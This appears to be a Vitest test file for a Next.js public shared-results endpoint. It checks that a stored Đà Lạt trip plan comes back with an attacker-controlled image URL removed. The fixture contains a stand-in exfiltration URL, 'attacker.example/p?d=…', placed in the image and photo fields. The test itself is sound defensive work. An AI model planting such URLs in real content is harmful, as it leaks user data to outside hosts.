import { describe, it, expect, vi } from 'vitest'
import { NextRequest } from 'next/server'

// Gate 2 G3 (G-T5) — the public JSON endpoint as a ROUTE (real handler, real loader; only the admin client and the rate limiter are
// mocked): `images` of an old snapshot no longer carries the rejected plan photo.

const EXFIL = 'https://attacker.example/p?d=QuanBinhThanh'
const HERO = 'https://cdn.example/hero.jpg'
const TBN = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTstop'
const stored = {
  id: 'id-1', slug: 'AbCdEfGh12', query: 'q', domain: 'travel', locale: 'vi', og_version: 1, view_count: 0, ask_count: 0,
  created_at: '2026-10-01T00:00:00.000Z', parent_id: null, owner_is_anonymous: false,
  payload: {
    v: 1, title: 'Đà Lạt 2 ngày', query: 'lên kế hoạch Đà Lạt', domain: 'travel', locale: 'vi', body: 'Kế hoạch.', buttons: [], images: [EXFIL, HERO, TBN], suggestedQuestions: [], createdAt: '2026-10-01T00:00:00.000Z',
    plan: { type: 'trip', title: 'Đà Lạt 2 ngày', days: [{ label: 'Ngày 1', items: [{ time: '08:00', category: 'food', name: 'Quán A', photo_url: EXFIL }, { time: '10:00', category: 'attraction', name: 'Hồ', photo_url: TBN }] }] },
  },
}
vi.mock('@/lib/supabase/admin', () => ({
  createAdminClient: () => {
    const chain = { select: () => chain, eq: () => chain, maybeSingle: async () => ({ data: JSON.parse(JSON.stringify(stored)), error: null }) }
    return { from: () => chain }
  },
}))
vi.mock('@/lib/security/publicRateLimit', () => ({
  publicDailyRateLimit: async () => ({ ok: true, retryAfter: 0, scope: 'instance' }),
  publicRateLimit: async () => ({ ok: true, retryAfter: 0, scope: 'instance' }),
}))

import { GET } from './route'

describe('G3 · GET /api/shared-results/[slug] (G-T5)', () => {
  it('images carries only allowed URLs, in order', async () => {
    const res = await GET(new NextRequest(new Request('https://www.tappyai.com/api/shared-results/AbCdEfGh12'), {}), { params: { slug: 'AbCdEfGh12' } })
    expect(res.status).toBe(200)
    const body = await res.json()
    expect(JSON.stringify(body)).not.toContain('attacker.example')
    expect(body.payload.images).toEqual([HERO, TBN])
  })
})
